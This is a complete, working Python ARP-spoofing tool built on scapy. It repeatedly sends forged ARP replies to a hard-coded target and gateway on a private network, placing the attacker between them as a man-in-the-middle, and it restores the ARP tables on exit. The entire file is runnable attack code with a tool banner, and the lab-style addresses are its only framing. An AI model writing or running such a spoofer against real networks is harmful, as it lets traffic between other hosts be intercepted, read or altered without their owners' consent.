#!/usr/bin/env python3

import scapy.all as scapy
import time


def GetMac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def Spoof(targetIP, spoofIP):
	# set up arp packet
	targetMAC = GetMac(targetIP)
	packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
	# send packet
	scapy.send(packet, verbose=False)


def RestoreARP(destIP, srcIP):
	# set up arp packet
	destMAC = GetMac(destIP)
	srcMAC = GetMac(srcIP)
	packet = scapy.ARP(op=2, pdst=destIP, hwdst=destMAC, psrc=srcIP, hwsrc=srcMAC)
	# send packet
	scapy.send(packet, count=4, verbose=False)


banner = r"""
 ________  ________  ________  ________  ________  ________  ________ 
|\   __  \|\   __  \|\   ____\|\   __  \|\   __  \|\   __  \|\  _____\
\ \  \|\  \ \  \|\  \ \  \___|\ \  \|\  \ \  \|\  \ \  \|\  \ \  \__/ 
 \ \   __  \ \   _  _\ \_____  \ \   ____\ \  \\\  \ \  \\\  \ \   __\
  \ \  \ \  \ \  \\  \\|____|\  \ \  \___|\ \  \\\  \ \  \\\  \ \  \_|
   \ \__\ \__\ \__\\ _\ ____\_\  \ \__\    \ \_______\ \_______\ \__\ 
    \|__|\|__|\|__|\|__|\_________\|__|     \|_______|\|_______|\|__| 
                       \|_________|                                   
                                                                      
                                                                      """


target_ip = "192.168.131.129"
gateway_ip = "192.168.131.2"

print(banner)

try:
	packetsSent = 0
	while(True):
		Spoof(target_ip, gateway_ip)
		Spoof(gateway_ip, target_ip)
		time.sleep(2)
		packetsSent += 2
		print("\r[+] Sent {0} packets".format(packetsSent), end="")
except KeyboardInterrupt as e:
	print("\n[-] restoring arp table")
	RestoreARP(target_ip, gateway_ip)
	RestoreARP(gateway_ip, target_ip)
	print("[-] Stopping program")
	exit()
